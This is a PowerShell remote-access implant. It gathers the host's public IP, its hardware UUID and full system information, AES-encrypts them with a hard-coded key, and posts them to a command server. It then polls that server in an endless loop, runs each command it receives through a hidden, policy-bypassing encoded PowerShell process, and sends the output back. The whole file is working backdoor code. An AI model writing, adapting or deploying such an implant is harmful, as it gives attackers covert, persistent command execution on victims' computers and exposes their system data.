$SERVER_URL = "http://localhost:8080/ReHTTP/Server/"
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls, [Net.SecurityProtocolType]::Tls11, [Net.SecurityProtocolType]::Tls12, [Net.SecurityProtocolType]::Ssl3
[Net.ServicePointManager]::SecurityProtocol = "Tls, Tls11, Tls12, Ssl3"
# start internal function
function SystemInfo {
    $IP = Invoke-RestMethod https://ident.me
    $UID = (Get-CimInstance -Class Win32_ComputerSystemProduct).UUID
    $INFO = Get-ComputerInfo
   
    # JSON SYSTEM INFO

    $SYSTEM = @{
        uuid      = "$UID"
        public_ip = "$IP"
        info      = $INFO
    }
 
    return $SYSTEM 
}

function EncryptString {
    Param ([string]$inputStr)

    $inputBytes = [System.Text.Encoding]::UTF8.GetBytes($inputStr)
    $enc = [System.Text.Encoding]::UTF8

    $AES = New-Object System.Security.Cryptography.AESManaged
    $iv = "&9*zS7LY%ZN1thfI"
    $AES.Mode = [System.Security.Cryptography.CipherMode]::CBC
    $AES.BlockSize = 128
    $AES.KeySize = 256
    $AES.IV = $enc.GetBytes($iv)
    $AES.Key = $enc.GetBytes("123456789012345678901234r0hollah")

    $encryptor = $AES.CreateEncryptor()

    $encryptedBytes = $encryptor.TransformFinalBlock($inputBytes, 0, $inputBytes.length)
    $output = [Convert]::ToBase64String($encryptedBytes)

    return $output
}
function DcryptString {
    Param ([string]$inputStr)
    $data = [Convert]::FromBase64String($inputStr)
    $iv = "&9*zS7LY%ZN1thfI"
    $key = "123456789012345678901234r0hollah".PadRight(16, [char]0)
    $aes = [System.Security.Cryptography.Aes]::Create()
    $utf8 = [System.Text.Encoding]::Utf8
    $aes.Key = $utf8.GetBytes($key)
    $aes.IV = $utf8.GetBytes($iv)
    $dec = $aes.CreateDecryptor()
    $RESULT = $dec.TransformFinalBlock($data, 0, $data.Length)
    $RESULTStr = $utf8.GetString($RESULT)
    Write-Output $RESULTStr
    $dec.Dispose()
}

function RunCommand {
    Param ([string]$inputStr)
    if ($inputStr -like "Terminate") {
        exit
    }
    $UnicodeEncoder = New-Object System.Text.UnicodeEncoding
    $EncodedPayloadScript = [Convert]::ToBase64String($UnicodeEncoder.GetBytes($inputStr))
    return  powershell -exec bypass -Noninteractive -windowstyle hidden -e  $EncodedPayloadScript | Out-String
    

}
# end internal function

while ($true) {
    $SYSTEM = SystemInfo 

    $JSON = $SYSTEM | ConvertTo-JSON -Depth 100
    $CRYPT = EncryptString  $JSON
 
    $PARAM = @{
        DATA     = $CRYPT
        new_user = "ok"
    
    }
    $URL = "$SERVER_URL"
 
    Invoke-RestMethod  -Method 'Post' -Uri $URL  -Body  $PARAM 
   
    while ($true) {
      
        sleep 1
        $UID = (Get-CimInstance -Class Win32_ComputerSystemProduct).UUID
        $SYSTEM = @{
            uuid = "$UID"
        }
        $JSON = $SYSTEM | ConvertTo-JSON -Depth 100
        $CRYPT = EncryptString  $JSON

        $PARAM = @{
            DATA = $CRYPT
            
        }
        $URL = "$SERVER_URL"
         
        $RESULT = Invoke-RestMethod  -Method 'Post' -Uri $URL  -Body  $PARAM 
        $REQ = DcryptString($RESULT)
        if ($REQ -ne "wait") {

            $JSON = $REQ | ConvertFrom-Json
            $MODE = $JSON.json
        
            $CMD = $JSON.cmd
            $RUN = RunCommand $CMD
            if ($RUN -eq "") {
                $RUN = "OK"
            }
            
         
            $CMD_UID = $JSON.cmd_uid
            $SYSTEM = @{
                uuid    = "$UID"
                result  = "$RUN"
                cmd_uid = "$CMD_UID"
            }
            $JSON = $SYSTEM | ConvertTo-JSON -Depth 100
         
            $CRYPT = EncryptString  $JSON

            $PARAM = @{
                DATA = $CRYPT
            
            }
            $URL = "$SERVER_URL"
         
            Invoke-RestMethod  -Method 'Post' -Uri $URL  -Body  $PARAM 
            
            
        }
    }
    
    
} 